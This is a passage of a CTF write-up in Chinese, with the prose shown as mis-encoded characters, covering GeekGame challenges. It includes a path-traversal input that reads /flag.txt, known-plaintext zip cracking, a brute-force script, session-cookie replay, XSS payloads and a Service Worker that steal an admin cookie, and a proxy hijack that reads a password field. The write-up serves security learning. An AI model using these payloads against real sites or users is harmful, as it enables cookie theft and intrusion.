      exec env -i LANG="$LANG" LANGUAGE="$LANGUAGE" LC_CTYPE="$LC_CTYPE" LC_NUMERIC="$LC_NUMERIC" LC_TIME="$LC_TIME" LC_COLLATE="$LC_COLLATE" LC_MONETARY="$LC_MONETARY" LC_MESSAGES="$LC_MESSAGES" LC_PAPER="$LC_PAPER" LC_NAME="$LC_NAME" LC_ADDRESS="$LC_ADDRESS" LC_TELEPHONE="$LC_TELEPHONE" LC_MEASUREMENT="$LC_MEASUREMENT" LC_IDENTIFICATION="$LC_IDENTIFICATION" LC_ALL="$LC_ALL" PATH="$PATH" TERM="$TERM" "$SERVICEDIR/$SERVICE" ${ACTION} ${OPTIONS}
   else
      echo "${SERVICE}: unrecognized service" >&2
      exit 1
   fi
}
```

å…¶ä¸­`SERVICEDIR`æ˜¯`/etc/init.d`ï¼Œ`SERVICE`æ˜¯æˆ‘çš„è¾“å…¥ï¼Œæ‰€ä»¥è¿™é‡Œåªéœ€è¦æŠŠ`/usr/bin/cat`æå‡ºæ¥å°±å¥½äº†ã€‚è¿ä¸Šç»ˆç«¯ï¼Œè¾“å…¥`STATUS`ã€`../../usr/bin/cat /flag.txt`ï¼Œç›´æ¥æŠŠflagè¾“å‡ºæ¥äº†ã€‚

## åŸºæœ¬åŠŸ
ä¸¤ä¸ªflagéƒ½æ˜¯zipå¯†ç çˆ†ç ´ï¼ˆå¥½åƒæ›´ä¸¥è°¨æ¥è¯´å«â€œzipæ˜æ–‡æ”»å‡»â€ï¼‰ï¼Œç”¨åˆ°çš„ä»£ç æ˜¯[bkcrack](https://github.com/kimci86/bkcrack)ã€‚èƒ½è§£å¯†çš„æ¡ä»¶è¯´ç®€å•ä¹Ÿç®€å•ï¼Œè¯´è‹›åˆ»ä¹Ÿæœ‰ç‚¹è‹›åˆ»ï¼š

- å‹ç¼©æ–¹æ³•éœ€è¦æ˜¯`Store`ï¼ŒåŠ å¯†ç®—æ³•éœ€è¦æ˜¯`ZipCrypto`ã€‚
- éœ€è¦çŸ¥é“å‹ç¼©åŒ…ä¸­çš„è‡³å°‘12ä¸ªå­—èŠ‚ï¼Œå…¶ä¸­è‡³å°‘æœ‰8ä¸ªå­—èŠ‚æ˜¯è¿ç»­çš„ï¼Œå¹¶ä¸”çŸ¥é“è¿™äº›å­—èŠ‚çš„ä½ç½®ã€‚

ä¸€èˆ¬æƒ…å†µä¸‹åˆ›å»ºå‹ç¼©åŒ…çš„å‹ç¼©æ–¹å¼éƒ½æ˜¯Deflateï¼Œé™¤éé€‰æ‹©â€œä»…å­˜å‚¨â€æ‰ä¼šå­˜æˆStoreï¼Œä¸è¿‡è¿™é¢˜åˆšå¥½ç»™çš„æ¡ä»¶å°±æ»¡è¶³ä¸Šè¿°ä¸¤ä¸ªæ¡ä»¶ã€‚

ç¬¬ä¸€ä¸ªæ–‡ä»¶é‡ŒåŒ…å«äº†ä¸€ä¸ª`chromedriver_linux64.zip`ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯Chromeå®˜æ–¹æä¾›çš„ï¼Œå¯ä»¥ç›´æ¥ä»[æ€»ç›®å½•](https://chromedriver.storage.googleapis.com/index.html)é‡Œä¸‹è½½ã€‚ä¸è¿‡Chrome Driveræœ‰å¾ˆå¤šç‰ˆæœ¬ï¼Œå¦‚æœä¸€ä¸ªä¸€ä¸ªä¸‹è½½ä¸‹æ¥å¤ªéº»çƒ¦äº†ï¼Œå¥½åœ¨å¯ä»¥ç”¨curlå‘é€HEADè¯·æ±‚è·å¾—æ–‡ä»¶å¤§å°ï¼Œç„¶åä»è¯·æ±‚ç»“æœé‡Œæ‰¾å¤§å°å’Œå‹ç¼©åŒ…é‡Œçš„å¤§å°`5845152`å¯¹å¾—ä¸Šçš„å°±è¡Œï¼š

``` shell
curl -I https://chromedriver.storage.googleapis.com/98.0.4758.48/chromedriver_linux64.zip > 98.0.4758.48.txt
```

ä¿å­˜å®Œä¹‹ååœ¨æ–‡ä»¶å¤¹é‡Œæ‰¾`content-length: 5845152`ï¼Œæ‰¾åˆ°ä¹‹åä¸‹è½½ä¸‹æ¥æ¯”å¯¹ä¸€ä¸‹CRC32ï¼Œåº”è¯¥æ˜¯åŒä¸€ä¸ªæ–‡ä»¶ã€‚

ç„¶åç›´æ¥è§£å¯†å³å¯ï¼Œbkcrackå¾—åˆ°çš„æ˜¯ä¸€ä¸ªå¯†é’¥ï¼Œè¿™ä¸ªå¯†é’¥å¹¶éå‹ç¼©åŒ…çš„å¯†ç ï¼Œä½†æ˜¯èƒ½å–‚ç»™è¿™ä¸ªç¨‹åºè®©å®ƒè§£å¯†å…¶ä»–æ–‡ä»¶ã€‚è§£å‹å‡ºæ¥`flag1.txt`ã€‚

ç¬¬äºŒä¸ªæ–‡ä»¶åŒ…å«äº†ä¸€ä¸ª`.pcapng`æ–‡ä»¶ï¼Œåˆšå·§æˆ‘å‚è€ƒçš„[ä¸€ç¯‡æ–‡ç« ](https://www.freebuf.com/articles/database/292628.html)è®²çš„å°±æ˜¯è¿™ä¸ªæ–‡ä»¶æ ¼å¼ï¼Œå¤´æ–‡ä»¶æ ¼å¼æ˜¯å›ºå®šçš„ï¼Œ`0x00-0x04`ä½ç½®æ˜¯`0a 0d 0d 0a`ï¼Œ`0x06-0x18`ä½ç½®æ˜¯`00 00 4d 3c 2b 1a 10 00 00 00 ff ff ff ff ff ff ff ff`ï¼Œå–‚ç»™bkcrackï¼Œå¾—åˆ°å¯†é’¥ï¼Œè§£å¯†å‡ºæ¥`flag2.txt`ã€‚

## Dark Room
### Flag 1
è¿™ä¸ªé¢˜å°±æ˜¯æˆ‘è¯´çš„é‚£ä¸ªâ€œç¨å¾®æœ‰ç‚¹äºâ€çš„é¢˜ï¼Œæ–¹æ³•éƒ½å·²ç»æ‰¾åˆ°äº†ï¼Œåªæ˜¯è¿æ°”ä¸å¤ªå¥½ã€‚

è¯´æ˜é‡Œé¢æåˆ°é¢˜ç›®åŸºäº[Dark_Room](https://github.com/tinichu316/Dark_Room)ï¼Œä¸‹è½½ä¸‹æ¥æºä»£ç å°±èƒ½çœ‹åˆ°åœ°å›¾ï¼Œå½“ç„¶è‡ªå·±æ‰‹åŠ¨ç”»ä¸€ä¸ªåœ°å›¾ä¹Ÿå¾ˆæ–¹ä¾¿ã€‚

æ¸¸æˆæµç¨‹ä¹Ÿå¾ˆç®€å•ï¼Œå…ˆæ‹¿é’¥åŒ™1ï¼Œç„¶åå»å¼€ç¬¬1æ‰‡é—¨ï¼Œå†å»æ‹¿é’¥åŒ™2ï¼Œæœ€åå¼€ç¬¬2æ‰‡é—¨ï¼Œç„¶åå°±å¯ä»¥è¿›å»äº†ã€‚é—®é¢˜åœ¨äºï¼Œåªæœ‰æ»¡è¶³`sanity`ï¼ˆç†æ™ºï¼Ÿï¼‰è‡³å°‘ä¸º117æ‰èƒ½æ‹¿åˆ°flagï¼Œè€Œè¿›è¡Œä»»ä½•æ“ä½œéƒ½ä¼šä½¿sanityå‡å°‘ï¼Œæ‰€ä»¥éœ€è¦æ‰¾åˆ°ä¸€æ¡æœ€çŸ­çš„è·¯å¾„ï¼Œè¿˜è¦æŠŠèƒ½åŠ sanityçš„ä¸œè¥¿éƒ½æ‹¿åˆ°ã€‚ç¿»äº†æºä»£ç ä¹‹åå‘ç°ï¼Œèƒ½å›ºå®šåŠ sanityçš„æ“ä½œåŒ…æ‹¬ï¼šæ‹¿é’¥åŒ™ã€æ‹¿è£…é¥°å“ã€ä½¿ç”¨è£…é¥°å“ã€å–æ‹¿é“ï¼Œä½†è¿™äº›è¿˜ä¸å¤Ÿï¼Œå¿…é¡»è¿˜å¾—ä½¿ç”¨helpåŠŸèƒ½ã€‚è€ŒhelpåŠŸèƒ½æ•ˆæœæ˜¯éšæœºçš„ï¼Œåªæœ‰1/5çš„æ¦‚ç‡æ˜¯sanityåŠ 10ï¼ˆå¦å¤–æ¯æ¬¡æ“ä½œsanityå›ºå®šå‡1ï¼Œå› æ­¤ç›¸å½“äºæ¯æ¬¡æ“ä½œsanityåŠ 9ï¼‰ï¼Œæ‰€ä»¥å¿…é¡»è¦å¤šè¯•å‡ æ¬¡ï¼Œè€Œä¸”è¿˜è¦æ‰¾åˆ°ä¸€æ¡æœ€çŸ­è·¯å¾„ã€‚

è¿™ç§çœ‹è¿æ°”çš„äº‹å½“ç„¶å¾—é çˆ†ç ´ï¼Œæ­£å¥½é¢˜ç›®ä¸Šä¹Ÿè¯´äº†â€œæœ¬é¢˜çš„è¿æ¥é¢‘ç‡é™åˆ¶æ˜¯ 3 ç§’ä¸€æ¬¡â€ï¼Œæ„æ€å°±æ˜¯é»˜è®¸å¤§å®¶çˆ†ç ´å§ã€‚ï¼ˆå¦å¤–æˆ‘çœ‹äº†å‚èµ›é¡»çŸ¥ï¼Œâ€œæ”»å‡»â€é¢˜ç›®æŒ‡å®šçš„ä¸»æœºä¸ç®—è¿è§„ï¼Œæ‰€ä»¥æ˜¯æ²¡é—®é¢˜çš„ã€‚ï¼‰

äºæ˜¯å†™ä¸ªPythonè„šæœ¬ï¼š

``` python
from pwn import *

COMMANDS = [
  "n",
  "n",
  "e",
  "pickup key",
  "w",
  "s",
  "s",
  "e",
  "e",
  "e",
  "pickup trinket",
  "use trinket",
  "w",
  "s",
  "usewith key door",
  "s",
  "s",
  "n",
  "w",
  "w",
  "w",
  "n",
  "pickup key",
  "s",
  "e",
  "e",
  "e",
  "n",
  "n",
  "n",
  "w",
  "w",
  "n",
  "n",
  "w",
  "w",
  "usewith key door",
  "h",
]

def play(file_name):
  writer = open(file_name, "w", -1, "utf8")
  conn = remote("prob16.geekgame.pku.edu.cn", 10016)
  conn.recvuntil(b"Please input your token: ")
  conn.send(b"MY TOKEN\n")
  time.sleep(1)
  conn.recvuntil(b"]: ", timeout=5)
  conn.send(b"newgame\n")
  conn.recvuntil(b"]: ", timeout=5)
  conn.send(b"gamer\n")
  conn.recvuntil(b"(y/n) ", timeout=5)
  conn.send(b"y\n")
  for command in COMMANDS:
    writer.write(conn.recvuntil(b"]: ", timeout=5).decode("utf8") + "\n")
    conn.send(command.encode("utf8") + b"\n")

  while True:
    result = conn.recvuntil(b"]: ", timeout=5).decode("utf8")
    writer.write(result + "\n")
    sanity = int(re.search(r"Sanity: \[[\|\-]+\] \((-?\d+)%\)", result).group(1))
    if sanity >= 118:
      conn.send(b"n\n")
      result = conn.recvuntil(b"]: ", timeout=5).decode("utf8")
      writer.write(result + "\n")
      writer.close()
      exit(0)
    elif sanity < 1:
      conn.close()
      break
    else:
      conn.send(b"h\n")
  writer.close()
  
i = 0
while True:
  play(f"output/{i}.txt")
  i += 1
  time.sleep(3.5)
```

å­˜æˆæ–‡ä»¶æ˜¯æ€•æˆ‘æ‰‹ä¸€æŠ–æŠŠç»ˆç«¯å…³äº†å…¨ç™½å¿™æ´»ã€‚æœ€ç»ˆåœ¨757.txtä¸­æˆ‘å¾—åˆ°äº†keyï¼Œæ­¤æ—¶çš„æ—¶é—´æ˜¯`2023-10-18 18:19`ï¼Œå°±å·®20åˆ†é’Ÿï¼Œ65%çš„åˆ†æ•°æ²¡äº†ã€‚

## éº¦æ©Â·åº“æ‹‰å¤«ç‰¹
### Flag 1ï¼šæ¢ç´¢çš„æ—¶å…‰
æ²¡æ€ä¹ˆç©è¿‡Minecraftï¼Œç°ä¸‹äº†ä¸€ä¸ªå¯åŠ¨å™¨ï¼Œåˆšå¥½æˆ‘æœ‰XGPï¼Œå¯ä»¥ç›´æ¥ç©å®˜æ–¹ç‰ˆã€‚æ‰¾äº†åŠå¤©ï¼Œæœ€ååœ¨ä¸€ä¸ªå²”è·¯ä¸Šæ‰¾åˆ°äº†flagã€‚

### Flag 2ï¼šç»“æŸäº†ï¼Ÿ
å®åœ¨æ˜¯åœ¨æ¸¸æˆé‡Œæ‰¾ä¸åˆ°ç¬¬2ä¸ªflagäº†ï¼Œäºæ˜¯æœäº†ä¸€ä¸ªå­˜æ¡£ç¼–è¾‘å™¨[NBTExplorer](https://github.com/jaquadro/NBTExplorer)ï¼Œè™½ç„¶æœ‰ç‚¹è€ï¼Œä½†æ˜¯ç«Ÿç„¶è¿˜èƒ½ç”¨ã€‚æ‰“å¼€ä¹‹åæœç´¢`flag{`å¯ä»¥æ‰¾åˆ°ç¬¬ä¸€ä¸ªflagï¼Œç„¶åå‘ç°å‘Šç¤ºç‰Œæœ‰ä¸€ä¸ªidæ˜¯`minecraft:sign`ï¼Œæ¥ç€æ‹¿è¿™ä¸ªidæ‰¾ï¼Œèƒ½æ‰¾åˆ°ç¬¬2ä¸ªflagã€‚

## Emoji Wordle
### Flag 1ï¼šLevel 1
é¢˜ç›®æç¤ºè¯´Level 1 çš„ç­”æ¡ˆæ˜¯å›ºå®šçš„ï¼Œè¿™å°±ç®€å•äº†ï¼Œç›´æ¥æ‹¿æ‰€æœ‰Emojiå¾€ä¸Šæ€¼ï¼Œçœ‹å“ªäº›Emojiåœ¨ç»™å‡ºçš„åºåˆ—é‡Œï¼ˆç»¿æˆ–é»„ï¼‰ï¼Œç„¶åæŠŠå¾—åˆ°çš„Emojiç”¨æœ€ç®€å•ç²—æš´çš„æ–¹æ³•å¤åˆ¶64éå¾€ä¸Šæ€¼ï¼Œå¾—åˆ°æ¯ä¸ªä½ç½®çš„æ­£ç¡®Emojiã€‚ä»£ç æ”¾åœ¨ä¸‹é¢ã€‚è¾“å…¥è¿›å»å¾—åˆ°flag 1ã€‚

### Flag 2ï¼šLevel 2
é¢˜ç›®æç¤ºè¯´ç­”æ¡ˆæ˜¯éšæœºç”Ÿæˆå¹¶å­˜å‚¨åœ¨ä¼šè¯ä¸­çš„ï¼Œé‚£å°±çœ‹ä¸€ä¸‹æ˜¯æ€ä¹ˆå­˜å‚¨çš„ã€‚æ‰“å¼€Chromeçš„æ§åˆ¶å°å¯ä»¥çœ‹åˆ°ä¸€ä¸ªCookieï¼š

``` plaintext
PLAY_SESSION=eyJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7ImxldmVsIjoiMiIsInJlbWFpbmluZ19ndWVzc2VzIjoiOCIsInRhcmdldCI6Ilx1RDgzRFx1REM0OVx1RDgzRFx1REM3Q1x1RDgzRFx1REM1NFx1RDgzRFx1REMzRlx1RDgzRFx1REM1OFx1RDgzRFx1REM2OVx1RDgzRFx1REM1Qlx1RDgzRFx1REM2Nlx1RDgzRFx1REM2MFx1RDgzRFx1REM2MVx1RDgzRFx1REM2M1x1RDgzRFx1REM3N1x1RDgzRFx1REM2Mlx1RDgzRFx1REM4Mlx1RDgzRFx1REM4N1x1RDgzRFx1REMzRlx1RDgzRFx1REM0Nlx1RDgzRFx1REM4N1x1RDgzRFx1REM3N1x1RDgzRFx1REM4Nlx1RDgzRFx1REM3OFx1RDgzRFx1REM0MFx1RDgzRFx1REM1Mlx1RDgzRFx1REM2OFx1RDgzRFx1REM1OVx1RDgzRFx1REM1Nlx1RDgzRFx1REM3N1x1RDgzRFx1REM3Mlx1RDgzRFx1REM2MVx1RDgzRFx1REM4N1x1RDgzRFx1REM0NFx1RDgzRFx1REM0Mlx1RDgzRFx1REM3N1x1RDgzRFx1REM4NVx1RDgzRFx1REM3M1x1RDgzRFx1REM3OFx1RDgzRFx1REM1NFx1RDgzRFx1REM3Mlx1RDgzRFx1REM4OVx1RDgzRFx1REM4M1x1RDgzRFx1REM3RFx1RDgzRFx1REM4Nlx1RDgzRFx1REM0MFx1RDgzRFx1REM4NVx1RDgzRFx1REM1Qlx1RDgzRFx1REM0M1x1RDgzRFx1REM0MVx1RDgzRFx1REM1QVx1RDgzRFx1REM0Nlx1RDgzRFx1REM1Mlx1RDgzRFx1REM3OVx1RDgzRFx1REM2QVx1RDgzRFx1REM4OFx1RDgzRFx1REM4MVx1RDgzRFx1REM1QVx1RDgzRFx1REM4NFx1RDgzRFx1REM3Rlx1RDgzRFx1REM4OVx1RDgzRFx1REM3NVx1RDgzRFx1REM3Qlx1RDgzRFx1REM2NVx1RDgzRFx1REM2MVx1RDgzRFx1REM1Nlx1RDgzRFx1REM3OCJ9LCJuYmYiOjE2OTc2MzY3MjAsImlhdCI6MTY5NzYzNjcyMH0.pcHR6VKrp5QMvc3VNKziwmIZhO9g93E_9KtIjOrmYy8; SameSite=Lax; Path=/; HTTPOnly
```

ä¸­é—´ä¸€é•¿ä¸²æŒºæœ‰è§„å¾‹ï¼Œçœ‹ç€åƒbase64ï¼Œè§£ç ä¸€ä¸‹ï¼š

``` json
{"data":{"level":"2","remaining_guesses":"8","target":"\uD83D\uDC49\uD83D\uDC7C\uD83D\uDC54\uD83D\uDC3F\uD83D\uDC58\uD83D\uDC69\uD83D\uDC5B\uD83D\uDC66\uD83D\uDC60\uD83D\uDC61\uD83D\uDC63\uD83D\uDC77\uD83D\uDC62\uD83D\uDC82\uD83D\uDC87\uD83D\uDC3F\uD83D\uDC46\uD83D\uDC87\uD83D\uDC77\uD83D\uDC86\uD83D\uDC78\uD83D\uDC40\uD83D\uDC52\uD83D\uDC68\uD83D\uDC59\uD83D\uDC56\uD83D\uDC77\uD83D\uDC72\uD83D\uDC61\uD83D\uDC87\uD83D\uDC44\uD83D\uDC42\uD83D\uDC77\uD83D\uDC85\uD83D\uDC73\uD83D\uDC78\uD83D\uDC54\uD83D\uDC72\uD83D\uDC89\uD83D\uDC83\uD83D\uDC7D\uD83D\uDC86\uD83D\uDC40\uD83D\uDC85\uD83D\uDC5B\uD83D\uDC43\uD83D\uDC41\uD83D\uDC5A\uD83D\uDC46\uD83D\uDC52\uD83D\uDC79\uD83D\uDC6A\uD83D\uDC88\uD83D\uDC81\uD83D\uDC5A\uD83D\uDC84\uD83D\uDC7F\uD83D\uDC89\uD83D\uDC75\uD83D\uDC7B\uD83D\uDC65\uD83D\uDC61\uD83D\uDC56\uD83D\uDC78"},"nbf":1697636720,"iat":1697636720}
```

æ˜¾ç„¶è¿™ä¸ªtargetå°±æ˜¯ç­”æ¡ˆã€‚è¾“å…¥è¿›å»å¾—åˆ°flag 2ã€‚

### Flag 3ï¼šLevel 3
æœ‰äº†å‰ä¸¤ä¸ªæç¤ºï¼ŒåŒæ ·æ‰“å¼€æ§åˆ¶å°çœ‹åˆ°Cookieï¼š

``` plaintext
PLAY_SESSION=eyJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7ImxldmVsIjoiMyIsInN0YXJ0X3RpbWUiOiIxNjk3NjM2ODE0NTkwIiwicmVtYWluaW5nX2d1ZXNzZXMiOiIzIiwic2VlZCI6IjEuNTAyMDk4NTM4Njg3ODQ4NEUxMiJ9LCJuYmYiOjE2OTc2MzY4MTQsImlhdCI6MTY5NzYzNjgxNH0.TxCiJrihsCRcOUBnQT2ZTVVtTtVkLR3pNnlI34LrQsA; SameSite=Lax; Path=/; HTTPOnly
```

è§£ç å‡ºæ¥ï¼š

``` json
{"data":{"level":"3","start_time":"1697636814590","remaining_guesses":"3","seed":"1.5020985386878484E12"},"nbf":1697636814,"iat":1697636814}
```

è¿™æ¬¡ä¿å­˜çš„æ˜¯éšæœºæ•°ç§å­ï¼Œå› ä¸ºä¸çŸ¥é“ç”Ÿæˆç®—æ³•ï¼Œæ‰€ä»¥ä¸èƒ½æœ¬åœ°ç®—ã€‚ä¸è¿‡è¿™ä¸ªCookieé‡Œé¢ç›´æ¥å°±ä¿å­˜äº†å‰©ä½™å°è¯•æ¬¡æ•°ï¼ˆ`remaining_guesses`ï¼‰ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æ‹¿Pythonæ¨¡æ‹Ÿè¯·æ±‚ï¼Œç„¶åæ¯æ¬¡éƒ½æŠŠåŒæ ·çš„Cookieå‘é€å‡ºå»ï¼Œå°±å¯ä»¥å¤šæ¬¡å°è¯•äº†ã€‚è¿™ä¸ªä»£ç æ˜¯ç›´æ¥æ‹¿flag 1çš„ä»£ç ä¿®æ”¹çš„ï¼š

``` python
import json
import os
import re
import requests

with open("emoji_list.txt", "r", -1, "utf8") as reader:
  x = "".join(reader.read().split("\n"))

cookies = None

for i in range(0, len(x), 64):
  sub = x[i:i+64]
  response = requests.get(f"https://prob14.geekgame.pku.edu.cn/level3?guess={sub}", cookies=cookies)
  if not cookies:
    cookies = response.cookies
  result = re.search(r"[ğŸŸ¥ğŸŸ¨ğŸŸ©]+", response.text).group(0)
  assert len(result) == len(sub)
  with open(f"3/{i // 64}.txt", "w", -1, "utf8", None, "\n") as writer:
    writer.write(sub + "\n" + result)

STATUS_NOT_IN = 0
STATUS_IN = 1
STATUS_CORRECT_POS = 2

char_pos = {
  i: [] for i in range(64)
}
char_in = ""

for file_name in os.listdir("3"):
  if not file_name.endswith(".txt"):
    continue
  with open(f"3/{file_name}", "r", -1, "utf8") as reader:
    x, y = reader.read().strip().split("\n")
  
  for i, (char, status) in enumerate(zip(x, y)):
    if status != "ğŸŸ¥":
      char_in += char

for i in char_in:
  sub = i * 64
  response = requests.get(f"https://prob14.geekgame.pku.edu.cn/level3?guess={sub}", cookies=cookies)
  result = re.search(r"[ğŸŸ¥ğŸŸ¨ğŸŸ©]+", response.text).group(0)
  assert len(result) == len(sub)
  with open(f"3/{ord(i)}.txt", "w", -1, "utf8", None, "\n") as writer:
    writer.write(sub + "\n" + result)

for file_name in os.listdir("3"):
  if not file_name.endswith(".txt"):
    continue
  with open(f"3/{file_name}", "r", -1, "utf8") as reader:
    x, y = reader.read().strip().split("\n")
  
  for i, (char, status) in enumerate(zip(x, y)):
    if status == "ğŸŸ©":
      char_pos[i] = char

sub = "".join(char_pos.values())
assert len(sub) == 64
response = requests.get(f"https://prob14.geekgame.pku.edu.cn/level3?guess={sub}", cookies=cookies)
print(response.text)
```

å…¶ä¸­`emoji_list.txt`æ˜¯æ‰€æœ‰çš„Emojiï¼Œæ¥è‡ª[Unicodeå®˜æ–¹](https://unicode.org/emoji/charts/full-emoji-list.html)ã€‚å¦å¤–flag 3ä¼¼ä¹æœ‰1åˆ†é’Ÿå†…è§£å†³çš„é™åˆ¶ã€‚

## ç¬¬ä¸‰æ–°XSS
### Flag 1ï¼šå·¡çŒ
XSSæˆ‘å¬è¯´è¿‡ï¼ŒXSS Botè¿˜æ˜¯ç¬¬ä¸€æ¬¡è§ã€‚çœ‹äº†ä¸€ä¸‹è§£é‡Šï¼Œåº”è¯¥æ˜¯è¯´XSS Botæ˜¯ä¸€ä¸ªæ¨¡æ‹Ÿçš„å—å®³è€…ã€‚

çœ‹äº†ä¸‹æºä»£ç ï¼Œå¯¹äºflag 1ï¼Œè¿™ä¸ªXSS Botå…ˆè®¿é—®`/admin/`å¹¶æ”¾ç½®Cookieï¼Œç„¶åå†è®¿é—®æˆ‘æä¾›çš„ç½‘é¡µï¼Œæœ€åè¾“å‡ºç½‘é¡µçš„æ ‡é¢˜ã€‚è€Œè¿™ä¸ªCookieæœ‰è·¯å¾„æ§åˆ¶ï¼Œæ²¡æ³•ç›´æ¥è¯»å–ã€‚ä¸è¿‡è·¯å¾„æ§åˆ¶å¾ˆå¥½è§£å†³ï¼Œæ‹¿iframeå°±èƒ½ç»•å¼€ã€‚ä»£ç ï¼š

``` html
<iframe src="/admin/" onload="document.title=document.getElementsByTagName(`iframe`)[0].contentDocument.cookie">
```

å¦å¤–è¦æ³¨æ„é¢˜ç›®åŒºåˆ†flag 1å’Œflag 2æ˜¯é åè®®ï¼Œåªæœ‰httpåè®®æ‰ä¼šç»™å‡ºflag 1ã€‚

### Flag 2ï¼šè®°å¿†
å’Œflag 1ç›¸åï¼Œflag 2éœ€è¦å…ˆè®¿é—®æˆ‘æä¾›çš„ç½‘é¡µï¼Œå†è®¿é—®`/admin/`å¹¶æ”¾ç½®Cookieã€‚

è¿™ä¸ªé—®é¢˜æˆ‘ä¸€å¼€å§‹çœŸæ²¡æƒ³åˆ°è§£å†³æ–¹æ³•ï¼Œçœ‹äº†æç¤ºæ‰çŸ¥é“æ˜¯[Service Worker](https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers)ï¼Œè¿™ä¸ªæŠ€æœ¯æˆ‘çŸ¥é“æœ‰ï¼Œä½†æ˜¯ä¸€ç›´æ²¡ç”¨è¿‡ï¼Œæ²¡æƒ³åˆ°è¿˜èƒ½ç”¨åœ¨è¿™é‡Œã€‚æ ¹æ®æ–‡æ¡£å’Œå…¶ä»–çš„ä¸€äº›æ•™ç¨‹ï¼Œæˆ‘éœ€è¦æ³¨å†Œä¸€ä¸ªService Workerï¼Œæ¥ç®¡`/admin/`é¡µé¢çš„æºä»£ç ã€‚

é¦–å…ˆè¦å†™ä¸€ä¸ªæ³¨å†Œé¡µé¢ï¼Œæ ¹æ®MDNçš„æ–‡æ¡£æ“äº†ä¸€ä¸ªï¼š

``` html
<script>
  const registerServiceWorker = async () => {
    if ("serviceWorker" in navigator) {
      try {
        const registration = await navigator.serviceWorker.register("/swjs/", {
          scope: "/",
        });
        if (registration.installing) {
          console.log("æ­£åœ¨å®‰è£… Service worker");
        } else if (registration.waiting) {
          console.log("å·²å®‰è£… Service worker installed");
        } else if (registration.active) {
          console.log("æ¿€æ´» Service worker");
        }
      } catch (error) {
        console.error(`æ³¨å†Œå¤±è´¥ï¼š${error}`);
      }
    }
  };
  registerServiceWorker();
</script>
```

ç„¶åå†™ä¸€ä¸ªè„šæœ¬ï¼Œç”±äºè¿™ä¸ªç½‘ç«™åªèƒ½ä¿å­˜æˆå­è·¯å¾„ï¼Œå› æ­¤éœ€è¦æ‰‹åŠ¨æ·»åŠ `Service-Worker-Allowed: /`è¿™ä¸ªHeaderã€‚JavaScriptï¼š

``` javascript
const enableNavigationPreload = async () => {
  if (self.registration.navigationPreload) {
    await self.registration.navigationPreload.enable();
  }
};

self.addEventListener("activate", (event) => {
  console.log("active");
  event.waitUntil(enableNavigationPreload());
});

self.addEventListener("install", (event) => {
  console.log("install");
});

self.addEventListener("fetch", (event) => {
  console.log("fetch");
  event.respondWith(
    new Response(
      "<title>HELLO</title><body><script>setInterval(()=>{document.title=document.cookie;},10);</script>",
      {
        status: 200,
        headers: { "Content-Type": "text/html" },
      }
    )
  );
});
```

Headerï¼š

``` json
{"Content-Type": "text/javascript", "Service-Worker-Allowed": "/"}
```

è¿™æ ·å°±èƒ½è·å¾—Flag2ã€‚

## éæ³•æ‰€å¾—
### Flag 2
ç´§è·Ÿæ—¶äº‹ã€‚

é¢˜ç›®ç»™å‡ºçš„æ˜¯ä¸€ä¸ªClash for Windowsçš„å®¢æˆ·ç«¯ï¼Œä½†æ˜¯æ²¡æœ‰æä¾›å®Œå…¨çš„æ“çºµæƒé™ï¼Œåªèƒ½æŸ¥çœ‹Generalã€Proxiesã€Profiesï¼Œä»¥åŠå¯¼å…¥é…ç½®æ–‡ä»¶ã€‚æ­¤å¤–å°±æ˜¯ä¸€ä¸ªæµè§ˆå™¨ï¼Œä¼šä½¿ç”¨è¿™ä¸ªClashæ¥è®¿é—®ç½‘ç«™ã€‚

çœ‹äº†ä¸€ä¸‹é¢˜ç›®æä¾›çš„æºä»£ç ï¼Œå½“è®¿é—®`ys.pku.edu.cn`è¿™ä¸ªåŸŸåçš„ç½‘é¡µæ—¶ï¼Œä¼šåœ¨idä¸º`primogem_code`ã€typeä¸º`password`çš„è¾“å…¥æ¡†å†…æ’å…¥flagï¼Œå› æ­¤åªè¦æƒ³åŠæ³•è®©å¯†ç åŒºæ˜¾ç¤ºå°±è¡Œäº†ã€‚å†™ä¸€ä¸ªhtmlé¡µé¢ï¼š

``` html
<html><body><input id="primogem_code" type="password"/><div id="primogem_code_out"></div><script>setInterval(() => {
  document.getElementById("primogem_code_out").innerHTML = document.getElementById("primogem_code").value;
}, 100);</script></body></html>
```

æ¥ä¸‹æ¥å°±æ˜¯è®¾ç½®ä¸€ä¸ªä»£ç†æœåŠ¡å™¨ï¼Œè®©æ‰€æœ‰å¯¹`ys.pku.edu.cn`è¿™ä¸ªåŸŸåçš„è®¿é—®åŠ«æŒåˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Šã€‚å¥½åœ¨ä¸å¼ºåˆ¶è¦æ±‚httpsï¼Œä¸éœ€è¦è€ƒè™‘è¯ä¹¦çš„é—®é¢˜ã€‚å…ˆä»é˜¿é‡Œäº‘ä¹°ä¸ªæŒ‰é‡ä»˜è´¹çš„äº‘ä¸»æœºï¼Œæ­å»ºä¸€ä¸ªnginxæœåŠ¡å™¨ï¼š

``` nginx
server {
	listen 80 default_server;
	listen [::]:80 default_server;

	root /var/www/html;
	index index.html;
	
	location / {
		try_files $uri $uri/ /index.html;
	}
}
```

ç„¶åå®‰è£…ä¸€ä¸ª[Tinyproxy](https://tinyproxy.github.io/)ï¼ŒæŒ‰ç…§å®˜æ–¹æ–‡æ¡£ä¿®æ”¹é…ç½®ï¼Œå°¤å…¶è®°ä½æŠŠ`ConnectPort`çš„é…ç½®åˆ æ‰ï¼ˆå…è®¸æ‰€æœ‰ç«¯å£è¿æ¥ï¼‰ã€‚å†ä¿®æ”¹`/etc/hosts`ï¼Œæ·»åŠ `127.0.0.1 ys.pku.edu.cn`ã€‚æœ€åå°±æ˜¯å†™ä¸€ä¸ª`.yml`é…ç½®æ–‡ä»¶ï¼ŒæŠŠæµé‡è½¬ç§»åˆ°æœåŠ¡å™¨ä¸Šï¼š

``` yaml
port: 7890
mode: Rule
log-level: info
external-controller: ":9090"
proxies:
  - name: YS
    type: http
    server: MY SERVER IP
    port: 35000
    skip-cert-verify: true
proxy-groups:
  - name: YSG
    type: select
    proxies:
      - YS
rules:
  - "DOMAIN-SUFFIX,pku.edu.cn,YSG"
  - "DOMAIN-SUFFIX,mihoyo.com,REJECT"
  - "GEOIP,CN,DIRECT"
  - "MATCH,DIRECT"
```

